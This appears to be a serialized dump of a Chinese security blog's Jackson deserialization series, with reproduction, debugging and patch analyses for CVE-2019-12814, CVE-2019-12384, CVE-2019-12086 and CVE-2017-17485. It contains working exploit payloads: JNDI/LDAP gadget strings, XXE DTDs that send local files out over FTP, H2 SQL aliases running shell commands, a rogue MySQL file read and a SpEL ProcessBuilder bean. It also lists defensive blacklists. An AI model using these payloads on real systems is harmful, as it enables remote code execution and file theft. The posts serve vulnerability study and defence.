null&#125;][&quot;org.apache.openjpa.ee.JNDIManagedRuntime&quot;, &#123;&quot;transactionManagerName&quot;:&quot;ldap://localhost:1389/Exploit&quot;, &quot;rollbackOnly&quot;: null&#125;][&quot;org.apache.axis2.transport.jms.JMSOutTransportInfo&quot;, &quot;jms:/ldap://localhost:1389/Exploit&quot;][&quot;net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup&quot;, &#123;&quot;properties&quot;:&#123;&quot;jndiname&quot;:&quot;rmi://localhost:1099/Exploit&quot;&#125;&#125;][&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;, &#123;&quot;jndiname&quot;:&quot;rmi://localhost:1099/Exploit&quot;&#125;] 0x06 检测与防御检查方法检查是否使用到了Jackson，并且版本号是否是漏洞版本，若是则排查是否存在ObjectMapper.readValue，同时排查是否开启了DefaultTyping或使用了设置有问题的@JsonTypeInfo注解。 防御方法 升级到最新版的Jackson； 禁用enableDefaultTyping()； 禁用@JsonTypeInfo注解，或严格限制只能使用值为JsonTypeInfo.Id.NONE或JsonTypeInfo.Id.NAME的注解； 避免使用Object作为Jackson反序列化的类型；","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）","date":"2019-11-24T09:08:45.000Z","path":"2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/","text":"该CVE其实是反序列化XXE导致的任意文件读取漏洞，这里简单复现分析下这条利用链。 0x01 影响版本Jackson 2.x系列 &lt;2.9.9.1 0x02 限制需要 JDOM 1.x 或 JDOM 2.x 的依赖支持。 0x03 复现利用需要的jar：jackson-annotations-2.9.9，jackson-core-2.9.9，jackson-databind-2.9.9，jdom2-2.0.6。 关键PoC： 1[\"org.jdom2.transform.XSLTransformer\", \"http://127.0.0.1/exp.xml\"] 完整Demo： 123456789101112public class PoC &#123; public static void main(String[] args) &#123; String payload = \"[\\\"org.jdom2.transform.XSLTransformer\\\", \\\"http://127.0.0.1/exp.xml\\\"]\"; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); try &#123; Object object = mapper.readValue(payload, Object.class); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 接着就是XXE的FTP外带数据的参数实体解析攻击了。 exp.xml： 123456&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;&lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1/xxe/evil.dtd&quot;&gt;%remote;%send;]&gt; evil.dtd： 1&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;ftp://127.0.0.1:21/%file;&apos;&gt;&quot;&gt; %all; 开启Web服务放置exp.xml和evil.dtd，再开启FTP服务进行监听接受数据。 运行，FTP服务端即可接收到目标文件内容： 0x04 调试分析前面的解析过程和之前分析的反序列化过程几乎是一样的，我们直接在newInstance()新建的实例中看到，调用到XSLTransformer类的构造函数，其中调用了newTemplates()方法来新建模板： 跟进newTemplates()方法，其中调用了XSLTC.compile()方法对输入参数内容进行解析： 跟下去，发现调用parse()函数来解析根节点的抽象语法树： 再跟进去看看，就是调用Parser.parse()解析XML，且调用的setFeature()设置的并不是XXE的有效防御设置，导致XXE漏洞的存在： 再往下，就是调用SAXParser.parse()函数来解析该XML内容了，就是XXE的触发的地方。 值得一提的是，OWASP推荐的防御XXE的setFeature()要设置下面几个值： 1234factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);factory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);factory.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);factory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false); 很明显看到，前面漏洞代码中setFeature()设置的并非前面的防御设置，因此并不能防御XXE： 1public static final String NAMESPACE_FEATURE = \"http://xml.org/sax/features/namespaces\"; 0x05 补丁分析Jackson在2.9.9.1版本中添加了该JDOM类的黑名单，具体的可在jackson-databind-2.9.9.1-sources.jar!/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java中看到： 123// [databind#2341]: jdom/jdom2 (2.9.9.1)s.add(\"org.jdom.transform.XSLTransformer\");s.add(\"org.jdom2.transform.XSLTransformer\"); 0x06 参考Java 反序列化漏洞始末（4）— jackson","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"Jackson系列五——CVE-2019-12384（基于logback利用链）","date":"2019-11-22T12:52:46.000Z","path":"2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/","text":"本次CVE是基于logback的利用链的。 0x01 影响版本Jackson 2.x系列 &lt;2.9.9.1 0x02 限制需要logback和H2数据库的依赖，但是用H2嵌入式数据库的场景很少见。 0x03 H2特性——用户自定义函数H2数据库，是Java实现的内存数据库，可作为嵌入式内存数据库，提供用户自定义数据库函数以及在数据库中注册函数的功能。 下面看看用户如何来自定义H2数据库函数的。 现在假设我们需要在H2数据库中实现Oracle的”TO_DATE”函数，那么需要的过程是这样的： 使用Java实现自定义函数的方法； 将Java的自定义函数注册到H2数据库中； 首先我们自定义这个函数： 123456789101112131415package com.seraph.bi.suite.support.h2;import java.text.SimpleDateFormat;import org.h2.tools.SimpleResultSet; ... public class Function &#123; public static java.sql.Date to_date(String source, String format) throws ParseException &#123; // TODO: 'YYYY-MM-DD' ? Oracle format? SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd\"); java.util.Date date = sdf.parse(source); return new java.sql.Date(date.getTime()); &#125; ...&#125; 以上代码段是TO_DATE的实现，但用户自定义的函数需注意的是：类和方法必须是公共（Public）的，且方法需为静态（static）的，如方法中使用了Connection对象需将其关闭。 第二步，我们将其注册到数据库中，执行CREATE ALIAS语句： 1CREATE ALIAS [IF NOT EXISTS] newFunctionAliasName [DETERMINISTIC] FOR classAndMethodName 本例的语句为： 1CREATE ALIAS TO_DATE FOR \"com.seraph.bi.suite.support.h2.Function.to_date\"; 之后，再执行类似如下语句，函数TO_DATE即可被解析了： 1SELECT to_date('2009-1-21','YYYY-MM-DD') from Your_Table; 0x04 复现利用需要的jar包如下： jackson-databind-2.9.8 jackson-annotations-2.9.8 jackson-core-2.9.8 logback-core-1.3.0-alpha4 h2-1.4.199 关键PoC： 1[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", &#123;\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'\"&#125;] 以下Demo，先尝试向目标服务器发起请求： 1234567891011121314public class PoC &#123; public static void main(String[] args) &#123; String payload = \"[\\\"ch.qos.logback.core.db.DriverManagerConnectionSource\\\", &#123;\\\"url\\\":\\\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'\\\"&#125;]\"; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); try &#123; Object object = mapper.readValue(payload, Object.class); // 反序列化之后还需要进行序列化操作才能触发！ String s = mapper.writeValueAsString(object); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 注意，反序列化之后需要调用ObjectMapper.writeValueAsString()即进行序列化操作才能成功触发漏洞，这就是该CVE的鸡肋之处。 运行后，目标服务端接收到GET方式请求/inject.sql即成功： PoC中的JSON实际上是在H2内存数据库初始化的时候执行RUNSCRIPT指令，从指定的URL中加载执行SQL脚本。而由于刚才的Demo中Web服务未放置该SQL脚本因为没有执行，下面来看看怎么实现漏洞利用。 在Web服务端编写inject.sql，根据H2的用户可自定义函数的功能来实现，第一部分是CREATE ALIAS命令用来自定义shellexec()函数的内容，第二部分是callSQL命令，用来调用前面自定义的函数： 123456CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException &#123; String[] command = &#123;\"cmd\", \"/c\", cmd&#125;; Runtime.getRuntime().exec(command);&#125;$$;CALL SHELLEXEC('calc') 再次运行即可成功弹计算器： 我们可以再优化一下。我们看到payload中，url键对应的值其实就是一条SQL命令jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://localhost:8000/inject.sql&#39;，因此，我们可以直接将相应的URL部分替换为其他SQL命令，使用文件存储方式先定义一个命令执行的函数，注意代码中的分号需要用反斜杠转义一下： 1[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", &#123;\"url\":\"jdbc:h2:file:~/.h2/mi1k7ea;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException &#123; Runtime.getRuntime().exec(cmd)\\\\; &#125;$$;\"&#125;] 这里jdbc:h2:file会在本地Users目录中生成指定的数据库文件即C:/Users/xx/.h2/mi1k7ea.mv.db，下次可以直接调用该文件进行操作。 接着同样使用文件存储模式，执行CALL命令调用刚刚自定义的函数即可时效内任意代码执行： 1[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", &#123;\"url\":\"jdbc:h2:file:~/.h2/mi1k7ea;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CALL SHELLEXEC('calc');\"&#125;] 0x05 调试分析我们在ch.qos.logback.core.db.DriverManagerConnectionSource类上的所有getter方法和setter方法上打上断点，然后调试发现： 如果在Jackson反序列化之后不调用ObjectMapper.writeValueAsString()，则只会调用DriverManagerConnectionSource类的setUrl()函数； 如果在Jackson反序列化之后调用ObjectMapper.writeValueAsString()，则在调用DriverManagerConnectionSource类的setUrl()函数之后再调用getDriverClass()、getUrl()、getConnection()； 接着在mapper.writeValueAsString(object);处打上断点重新调试。 在Jackson序列化的过程中，会通过调用getter方法来获取对象的属性值，会循环调用BeanPropertyWriter.serializeAsField()函数，其中通过反射机制来调用要序列化的对象所属类的getter方法： 在循环调用 函数的时候，会先后调用getDriverClass()、getUrl()、getConnection()等类的getter方法。 在最后调用getConnection()函数中，调用了DriverManager.getConnection()函数来和H2数据库进行连接交互，并且由于url参数我们外部可控，因此就能利用H2用户可自定义函数的特性来实现RCE： 0x06 补丁分析Jackson在2.9.9.1版本中添加了ch.qos.logback.core.db.DriverManagerConnectionSource类的黑名单，具体的可在jackson-databind-2.9.9.1-sources.jar!/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java中看到： 12// [databind#2334]: logback-core (2.9.9.1)s.add(\"ch.qos.logback.core.db.DriverManagerConnectionSource\"); 0x07 参考Jackson gadgets - Anatomy of a vulnerability","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）","date":"2019-11-19T13:04:08.000Z","path":"2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/","text":"该CVE是基于MiniAdmin的利用链的，和以往反序列化执行命令的漏洞不一样，本次的反序列化读取任意文件内容，如果ClassPath中有com.mysql.cj.jdbc.admin.MiniAdmin（存在MySQL的JDBC驱动中）这个类，那么Java应用所在的服务器上的文件，就可能被任意读取并传送到恶意的MySQL Server。 0x01 影响版本Jackson 2.x系列 &lt; 2.9.9 0x02 限制目标环境中需存在8.0.14版本以下的MySQL驱动，即mysql-connector-java版本 &lt; 8.0.14。 更具体地说，mysql-connector-java版本应为 6.0.3-8.0.15 之间才能成功触发。 0x03 利用到的MySQL特性问题LOAD DATA LOCAL 具体可参考：https://dev.mysql.com/doc/refman/5.7/en/load-data-local.html 下面简单说下。 MySQL支持使用LOAD DATA LOCAL INFILE语法，即可将客户端本地的文件中的数据insert到MySQL的某张表中。 协议的工作过程大致如下： 用户在客户端输入：load data local file “/data.txt” into table test； 客户端-&gt;服务端：我想把我本地的/data.txt文件插入到test表中； 服务端-&gt;客户端：把你本地的/data.txt文件发给我； 客户端-&gt;服务端：/data.txt文件的内容； 问题在于，客户端发送哪个文件的内容，取决于第三步即服务端响应的想要的哪个文件，如果服务端是个恶意的MySQL，那么它可以读取客户端的任意文件内容，比如读取/etc/passwd： 用户在客户端输入：load data local file “/data.txt” into table test； 客户端-&gt;服务端：我想把我本地的/data.txt文件插入到test表中； 服务端-&gt;客户端：把你本地的/etc/passwd文件发给我； 客户端-&gt;服务端：/etc/passwd文件的内容； 而且，在大部分客户端（比如MySQL Connect/J）的实现里，第一步和第二部并非是必须的，客户端发送任意查询给服务端，服务端都可以返回文件发送的请求。而大部分客户端在建立连接之后，都会有一些查询服务器配置之类的查询，所以使用这些客户端，只要创建了到恶意MySQL服务器的连接，那么客户端所在的服务器上的所有文件都可能泄露。 allowLoadLocalInfileallowLoadLocalInfile是MySQL的JDBC驱动的一个创建连接的配置项，用来控制是否允许从本地读取文件，默认值为True。 0x04 复现利用PoC.java： 123456789101112public class PoC &#123; public static void main(String[] args) &#123; String payload = \"[\\\"com.mysql.cj.jdbc.admin.MiniAdmin\\\",\\\"jdbc:mysql://192.168.10.128:3307/test\\\"]\"; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); try &#123; mapper.readValue(payload, Object.class); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 下载恶意的MySQL服务器脚本，并运行在Linux中，同时指定读取目标MySQL客户端的哪个文件： 1python rogue_mysql_server.py \"C:/Windows/win.ini\" 运行后，可以在MySQL服务端的mysql.log中读取到客户端的文件内容： 0x05 调试分析在mapper.readValue(payload, Object.class);处打下断点进行调试。同时，我们分析MiniAdmin类发现，它并没有getter方法和setter方法，只有构造函数，也就是说该类的漏洞在于它的构造函数中，直接在它的构造函数处打下断点即可。 前面的函数调用过程和之前的没啥区别，直至调用newInstance()函数创建新的MiniAdmin类实例时，会调用到MiniAdmin类的构造函数，而该函数中则是直接调用了Jdbc的connect()方法、会直接去连接jdbcUrl指向的数据库地址： 利用链：newInstance()-&gt;MiniAdmin()-&gt;Driver.connect() 函数调用栈如下： 123456789101112131415161718&lt;init&gt;:95, MiniAdmin (com.mysql.cj.jdbc.admin)&lt;init&gt;:79, MiniAdmin (com.mysql.cj.jdbc.admin)newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)newInstance:62, NativeConstructorAccessorImpl (sun.reflect)newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)newInstance:422, Constructor (java.lang.reflect)call1:129, AnnotatedConstructor (com.fasterxml.jackson.databind.introspect)createFromString:299, StdValueInstantiator (com.fasterxml.jackson.databind.deser.std)deserializeFromString:1204, BeanDeserializerBase (com.fasterxml.jackson.databind.deser)_deserializeOther:144, BeanDeserializer (com.fasterxml.jackson.databind.deser)deserialize:135, BeanDeserializer (com.fasterxml.jackson.databind.deser)_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)deserializeTypedFromAny:68, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)deserializeWithType:554, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)deserialize:63, TypeWrappedDeserializer (com.fasterxml.jackson.databind.deser.impl)_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)main:19, PoC 0x06 为何需要MySQL Connector/J &gt;= 6.0.3我们在mysql-connector-java-6.0.3-sources.jar!/com/mysql/cj/core/conf/PropertyDefinitions.java中看到，在其静态代码块中对maxAllowedPacket设置项设置为65535，即默认允许最大的包大小为65535： 而在中，我们发现其静态代码块中对maxAllowedPacket设置项设置为-1，也就是说默认不让你发包，也就不存在漏洞了： 0x07 补丁分析MySQL Connector/J的修复MySQL Connector/J从8.0.15版本开始将allowLoadLocalInfile默认值设置为false。 https://dev.mysql.com/doc/relnotes/connector-j/8.0/en/news-8-0-15.html Jackson的修复从2.9.9版本开始，Jackson将”com.mysql.cj.jdbc.admin.MiniAdmin”加入到反序列化黑名单中： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 static &#123; Set&lt;String&gt; s = new HashSet&lt;String&gt;(); // Courtesy of [https://github.com/kantega/notsoserial]: // (and wrt [databind#1599]) s.add(\"org.apache.commons.collections.functors.InvokerTransformer\"); s.add(\"org.apache.commons.collections.functors.InstantiateTransformer\"); s.add(\"org.apache.commons.collections4.functors.InvokerTransformer\"); s.add(\"org.apache.commons.collections4.functors.InstantiateTransformer\"); s.add(\"org.codehaus.groovy.runtime.ConvertedClosure\"); s.add(\"org.codehaus.groovy.runtime.MethodClosure\"); s.add(\"org.springframework.beans.factory.ObjectFactory\"); s.add(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"); s.add(\"org.apache.xalan.xsltc.trax.TemplatesImpl\"); // [databind#1680]: may or may not be problem, take no chance s.add(\"com.sun.rowset.JdbcRowSetImpl\"); // [databind#1737]; JDK provided s.add(\"java.util.logging.FileHandler\"); s.add(\"java.rmi.server.UnicastRemoteObject\"); // [databind#1737]; 3rd party//s.add(\"org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor\"); // deprecated by [databind#1855] s.add(\"org.springframework.beans.factory.config.PropertyPathFactoryBean\");// s.add(\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\"); // deprecated by [databind#1931]// s.add(\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"); // - \"\" - // [databind#1855]: more 3rd party s.add(\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"); s.add(\"com.sun.org.apache.bcel.internal.util.ClassLoader\"); // [databind#1899]: more 3rd party s.add(\"org.hibernate.jmx.StatisticsService\"); s.add(\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\"); // [databind#2032]: more 3rd party; data exfiltration via xml parsed ext entities s.add(\"org.apache.ibatis.parsing.XPathParser\"); // [databind#2052]: Jodd-db, with jndi/ldap lookup s.add(\"jodd.db.connection.DataSourceConnectionProvider\"); // [databind#2058]: Oracle JDBC driver, with jndi/ldap lookup s.add(\"oracle.jdbc.connector.OracleManagedConnectionFactory\"); s.add(\"oracle.jdbc.rowset.OracleJDBCRowSet\"); // [databind#2097]: some 3rd party, one JDK-bundled s.add(\"org.slf4j.ext.EventData\"); s.add(\"flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor\"); s.add(\"com.sun.deploy.security.ruleset.DRSHelper\"); s.add(\"org.apache.axis2.jaxws.spi.handler.HandlerResolverImpl\"); // [databind#2186]: yet more 3rd party gadgets s.add(\"org.jboss.util.propertyeditor.DocumentEditor\"); s.add(\"org.apache.openjpa.ee.RegistryManagedRuntime\"); s.add(\"org.apache.openjpa.ee.JNDIManagedRuntime\"); s.add(\"org.apache.axis2.transport.jms.JMSOutTransportInfo\"); // [databind#2326] (2.9.9): one more 3rd party gadget s.add(\"com.mysql.cj.jdbc.admin.MiniAdmin\"); DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s); &#125; 0x08 参考分析Jackson的安全漏洞CVE-2019-12086 https://github.com/jas502n/CVE-2019-12086-jackson-databind-file-read","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）","date":"2019-11-17T05:02:59.000Z","path":"2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/","text":"本次Jackson反序列化漏洞是基于org.springframework.context.support.ClassPathXmlApplicationContext的利用链的。在开启enableDefaultTyping()或使用有问题的@JsonTypeInfo注解的前提下，可以通过jackson-databind来滥用Spring的SpEL表达式注入漏洞来触发Jackson反序列化漏洞的，从而达到任意命令执行的效果。 0x01 影响版本Jackson 2.7系列 &lt; 2.7.9.2 Jackson 2.8系列 &lt; 2.8.11 Jackson 2.9系列 &lt; 2.9.4 0x02 限制不受JDK限制，可直接在JDK1.8上运行。 需要服务端环境存在额外的jar包，以我本地环境为例：jackson-annotations-2.7.9，jackson-core-2.7.9，jackson-databind-2.7.9，spring-beans-5.0.2.RELEASE，spring-context-5.0.2.RELEASE，spring-core-5.0.2.RELEASE，spring-expression-5.0.2.RELEASE，commons-logging-1.2。 0x03 复现利用PoC.java： 12345678910111213public class PoC &#123; public static void main(String[] args) &#123; //CVE-2017-17485 String payload = \"[\\\"org.springframework.context.support.ClassPathXmlApplicationContext\\\", \\\"http://127.0.0.1/spel.xml\\\"]\"; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); try &#123; mapper.readValue(payload, Object.class); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; spel.xml，放置在第三方Web服务中，看到id为pb的bean标签，指定了类为java.lang.ProcessBuilder，在其中有两个子标签，constructor-arg标签设置参数值为具体的命令，property标签： 123456789&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt; &lt;bean id=\"pb\" class=\"java.lang.ProcessBuilder\"&gt; &lt;constructor-arg value=\"calc.exe\" /&gt; &lt;property name=\"whatever\" value=\"#&#123; pb.start() &#125;\"/&gt; &lt;/bean&gt;&lt;/beans&gt; 运行即可成功触发： 0x04 调试分析本次的利用链是基于org.springframework.context.support.ClassPathXmlApplicationContext类，利用的原理就是SpEL表达式注入漏洞。 我们在mapper.readValue(payload, Object.class);上打上断点开始调试。 调试到UntypedObjectDeserializer.deserializeWithType()函数，其中会调用AsArrayTypeDeserializer.deserializeTypedFromAny()函数来解析我们数组形式的JSON内容： 往下调试，发现会调用BeanDeserializerBase.deserializeFromString()函数来反序列化字符串内容，它会返回一个调用createFromString()函数从字符串中创建的实例对象： 跟进去看StdValueInstantiator.createFromString()函数，此时_fromStringCreator变量为AnnotatedConstructor类实例，参数value值为http://127.0.0.1/spel.xml，接着就是调用AnnotatedConstructor.call1()： 跟进去，调用了Constructor.newInstance()方法来创建新的实例： 往下调试，会调用到ClassPathXmlApplicationContext类的构造函数，看到configLocations参数值为spel.xml文件所在的URL地址，由于refresh参数值为True，因此会调用到refresh()函数： 注意：前面调用newInstance()是新建我们的利用类org.springframework.context.support.ClassPathXmlApplicationContext的实例，但是我们看到并没有调用ClassPathXmlApplicationContext类相关的setter方法，这是因为该类本身就没有setter方法，但是拥有构造函数，因此Jackson反序列化的时候会自动调用ClassPathXmlApplicationContext类的构造函数。而这个点就是和之前的利用链的不同之处，该类的漏洞点出在自己的构造函数而非在setter方法中。 下面我们继续调试看看ClassPathXmlApplicationContext类的构造函数中是哪里存在有漏洞。 跟进refresh()函数，进行一系列refresh之前的准备操作后，发现调用了invokeBeanFactoryPostProcessors()函数，顾名思义，就是调用上下文中注册为beans的工厂处理器： 继续跟下去，invokeBeanFactoryPostProcessors()函数中调用了getBeanNamesForType()函数来获取Bean名类型： 往下，进一步调用doGetBeanNamesForType()函数： 在doGetBeanNamesForType()函数中，调用isFactoryBean()判断当前beanName是否为FactoryBean，此时beanName参数值为”pb”，mbd参数中识别到bean标签中的类为java.lang.ProcessBuilder： 在isFactoryBean()函数中，调用predictBeanType()函数获取Bean类型： 跟进去，predictBeanType()函数中通过调用determineTargetType()函数来预测Bean类型： determineTargetType()函数中通过调用()函数来确定目标类型： 跟下去，AbstractBeanFactory.resolveBeanClass()-&gt;AbstractBeanFactory.doResolveBeanClass()，用来解析Bean类，其中调用了evaluateBeanDefinitionString()函数来执行Bean定义的字符串内容，此时className参数指向”java.lang.ProcessBuilder”： 跟进AbstractBeanFactory.evaluateBeanDefinitionString()函数，其中调用了this.beanExpressionResolver.evaluate()，此时this.beanExpressionResolver指向的是StandardBeanExpressionResolver，也就是说已经调用到对应的SpEL表达式解析器了： 跟进StandardBeanExpressionResolver.evaluate()函数，发现调用了Expression.getValue()方法即SpEL表达式执行的方法，其中sec参数是我们可以控制的内容即由spel.xml解析得到的SpEL表达式： 后续就是SpEL表达式注入漏洞导致的任意代码执行了。 至此，整个调用过程就大致过了遍。简单地说，就是传入的需要被反序列化的org.springframework.context.support.ClassPathXmlApplicationContext类，它的构造函数存在SpEL注入漏洞，进而导致可被利用来触发Jackson反序列化漏洞。 调用到evaluate()函数时的函数调用栈如下： 123456789101112131415161718192021222324252627282930evaluate:163, StandardBeanExpressionResolver (org.springframework.context.expression)evaluateBeanDefinitionString:1452, AbstractBeanFactory (org.springframework.beans.factory.support)doResolveBeanClass:1409, AbstractBeanFactory (org.springframework.beans.factory.support)resolveBeanClass:1372, AbstractBeanFactory (org.springframework.beans.factory.support)determineTargetType:670, AbstractAutowireCapableBeanFactory (org.springframework.beans.factory.support)predictBeanType:637, AbstractAutowireCapableBeanFactory (org.springframework.beans.factory.support)isFactoryBean:1489, AbstractBeanFactory (org.springframework.beans.factory.support)doGetBeanNamesForType:421, DefaultListableBeanFactory (org.springframework.beans.factory.support)getBeanNamesForType:391, DefaultListableBeanFactory (org.springframework.beans.factory.support)invokeBeanFactoryPostProcessors:84, PostProcessorRegistrationDelegate (org.springframework.context.support)invokeBeanFactoryPostProcessors:693, AbstractApplicationContext (org.springframework.context.support)refresh:531, AbstractApplicationContext (org.springframework.context.support)&lt;init&gt;:144, ClassPathXmlApplicationContext (org.springframework.context.support)&lt;init&gt;:85, ClassPathXmlApplicationContext (org.springframework.context.support)newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)newInstance:62, NativeConstructorAccessorImpl (sun.reflect)newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)newInstance:422, Constructor (java.lang.reflect)call1:129, AnnotatedConstructor (com.fasterxml.jackson.databind.introspect)createFromString:299, StdValueInstantiator (com.fasterxml.jackson.databind.deser.std)deserializeFromString:1204, BeanDeserializerBase (com.fasterxml.jackson.databind.deser)_deserializeOther:144, BeanDeserializer (com.fasterxml.jackson.databind.deser)deserialize:135, BeanDeserializer (com.fasterxml.jackson.databind.deser)_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)deserializeTypedFromAny:68, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)deserializeWithType:554, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)deserialize:63, TypeWrappedDeserializer (com.fasterxml.jackson.databind.deser.impl)_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)main:18, PoC 0x05 补丁分析换成jackson-databind-2.7.9.2版本的jar试试，会报错，显示由于安全原因禁止了该非法类的反序列化操作： 1com.fasterxml.jackson.databind.JsonMappingException: Illegal type (org.springframework.context.support.ClassPathXmlApplicationContext) to deserialize: prevented for security reasons 在jackson-databind-2.7.9.2-sources.jar!\\com\\fasterxml\\jackson\\databind\\jsontype\\impl\\SubTypeValidator.java中可以看到具体的黑名单信息，很遗憾的是没看到我们的利用类： 12345678910111213141516171819202122232425262728static &#123; Set&lt;String&gt; s = new HashSet&lt;String&gt;(); // Courtesy of [https://github.com/kantega/notsoserial]: // (and wrt [databind#1599]) s.add(\"org.apache.commons.collections.functors.InvokerTransformer\"); s.add(\"org.apache.commons.collections.functors.InstantiateTransformer\"); s.add(\"org.apache.commons.collections4.functors.InvokerTransformer\"); s.add(\"org.apache.commons.collections4.functors.InstantiateTransformer\"); s.add(\"org.codehaus.groovy.runtime.ConvertedClosure\"); s.add(\"org.codehaus.groovy.runtime.MethodClosure\"); s.add(\"org.springframework.beans.factory.ObjectFactory\"); s.add(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"); s.add(\"org.apache.xalan.xsltc.trax.TemplatesImpl\"); // [databind#1680]: may or may not be problem, take no chance s.add(\"com.sun.rowset.JdbcRowSetImpl\"); // [databind#1737]; JDK provided s.add(\"java.util.logging.FileHandler\"); s.add(\"java.rmi.server.UnicastRemoteObject\"); // [databind#1737]; 3rd party //s.add(\"org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor\"); // deprecated by [databind#1855] s.add(\"org.springframework.beans.factory.config.PropertyPathFactoryBean\"); s.add(\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\"); s.add(\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"); // [databind#1855]: more 3rd party s.add(\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"); s.add(\"com.sun.org.apache.bcel.internal.util.ClassLoader\"); DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s);&#125; 那么为啥能修补呢？我们调试看看。 在调用BeanDeserializerFactory.createBeanDeserializer()时，其中会调用_validateSubType()函数对子类型进行校验： 在SubTypeValidator._validateSubType()函数中看到，先进行黑名单过滤，发现类名不在黑名单后再判断是否是以”org.springframe”开头的类名，是的话循环遍历目标类的父类是否为”AbstractPointcutAdvisor”或”AbstractApplicationContext”，是的话跳出循环然后抛出异常： 而我们的利用类其继承关系是这样的：…-&gt;AbstractApplicationContext-&gt;AbstractRefreshableApplicationContext-&gt;AbstractRefreshableConfigApplicationContext-&gt;AbstractXmlApplicationContext-&gt;ClassPathXmlApplicationContext 可以看到，ClassPathXmlApplicationContext类是继承自AbstractApplicationContext类的，而该类会被过滤掉，从而没办法成功绕过利用。 